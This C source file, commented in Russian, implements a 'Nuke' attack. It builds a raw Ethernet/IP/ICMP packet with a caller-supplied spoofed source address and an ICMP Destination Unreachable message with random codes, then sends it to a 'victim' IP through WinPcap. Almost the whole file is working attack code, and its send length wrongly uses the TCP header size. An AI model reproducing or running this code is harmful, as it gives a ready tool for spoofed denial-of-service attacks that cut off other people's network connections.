﻿#define WPCAP
#define HAVE_REMOTE

#include <pcap.h>

#include "../headers/types.h"
#include "../headers/ethernet.h"
#include "../headers/ip.h"
#include "../headers/icmp.h"
#include "../headers/tcp.h"

extern pcap_t* select_device();
extern WORD checksum(WORD *buffer, DWORD size);

/******************************************************************************/
//  Функция, осуществляющая атаку Nuke.
//
//  Входные параметры:
//      char *victim_ip_address - IP адресс жертвы.
//      char *source_ip_address - IP адресс отправителя.
//  Выходные параметры:
//      int - возвращаемое значение.
//          '0' - Все в порядке.
//          '-1' - Возникли некоторые ошибки.
/******************************************************************************/
int nuke(char *victim_ip_address, char *source_ip_address)
{
    struct ethernet_header ethernet;    // Ethernet заголовок.
    struct ip_header ip;                // IP заголовок.
    struct icmp_header icmp;            // ICMP заголовок.

    pcap_t *device_handle;              // Открытое устройство для приема/передачи данных.

    char data[33] = {"abcdefghijklmnopqrstuvwabcdefghi"};   // Отправляемые данные.
    char packet[65536] = {0};                               // Отправляемый пакет.
    char temp_buffer[65535] = {0};                          // Временный буффер.

    device_handle = select_device();
    // Заполнение Ethernet заголовка.
    ethernet.source_mac_address[0] = 0x00;
    ethernet.source_mac_address[1] = 0x00;
    ethernet.source_mac_address[2] = 0x00;
    ethernet.source_mac_address[3] = 0x00;
    ethernet.source_mac_address[4] = 0x00;
    ethernet.source_mac_address[5] = 0x00;
    ethernet.destination_mac_address[0] = 0xff;
    ethernet.destination_mac_address[1] = 0xff;
    ethernet.destination_mac_address[2] = 0xff;
    ethernet.destination_mac_address[3] = 0xff;
    ethernet.destination_mac_address[4] = 0xff;
    ethernet.destination_mac_address[5] = 0xff;
    ethernet.type = htons(ETHERNET_TYPE_IP);
    // Формирование пакета.
    memcpy(packet, &ethernet, sizeof(ethernet_header));
    // Заолнение IP заголовка.
    ip.version = 4;                                             // Версия протокола IPv4.
    ip.header_length = 5;                                       // Длинна IP заголовка.
    ip.type_of_service = 0;                                     // Тип обслуживания.
    ip.total_length = htons(sizeof(ip_header) +
                            sizeof(icmp_header) +
                            sizeof(data));                      // Длинна = IP заголовок + ICMP заголовок + данные.
    ip.identification = 0;                                      // Идентификатор.
    ip.flags_fragmentation_offset = 0;                          // Флаги фрагментации и смещение.
    ip.time_to_live = 255;                                      // Возможное количество пройденных маршрутизаторов.
    ip.protocol = IPPROTO_ICMP;                                 // Протокол следующего уровня.
    ip.destination_ip_address = inet_addr(victim_ip_address);   // IP адрес получателя.
    ip.source_ip_address = inet_addr(source_ip_address);        // IP адрес отправителя.
    ip.header_checksum = 0;                                     // Контрольная сумма IP заголовка.
    // Вычисление контрольной суммы IP заголовка.
    ip.header_checksum = checksum((WORD*)&ip, sizeof(ip_header));
    // Формирование пакета.
    memcpy((packet + sizeof(ethernet_header)), &ip, sizeof(ip_header));
    // Заполнение ICMP заголовка.
    icmp.type = ICMP_TYPE_DESTINATION_UNREACHABLE;      // Тип сообщения.
    icmp.checksum = 0;                                  // Контрольная сума.
    icmp.code = htons((rand() % 0xff));                 // Код ошибки.
    icmp.identifier = htons((rand() % 0xffff));         // Идентификатор.
    icmp.sequence_number = htons((rand() % 0xffff));    // Номер последовательности.

    // Добавляем во временный буфер ICMP заголовок.
    memcpy(temp_buffer, &icmp, sizeof(icmp_header));
    // Добавляем во временный буфер данные.
    memcpy((temp_buffer + sizeof(icmp_header)), &data, sizeof(data));
    // Вычисляем контрольную сумму ICMP заголовка.
    icmp.checksum = checksum((WORD*)&temp_buffer, (sizeof(icmp_header) + sizeof(data)));
    // Формирование пакета.
    memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header)), &icmp, sizeof(icmp_header));
    memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header) + sizeof(icmp_header)), &data, sizeof(data));

    // Отправляем пакет в сеть.
    if (pcap_sendpacket(device_handle,
                        (u_char*)packet,
                        (sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header) + sizeof(data))) != 0)
    {
        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(device_handle));
        return -1;
    }

    return 0;
}
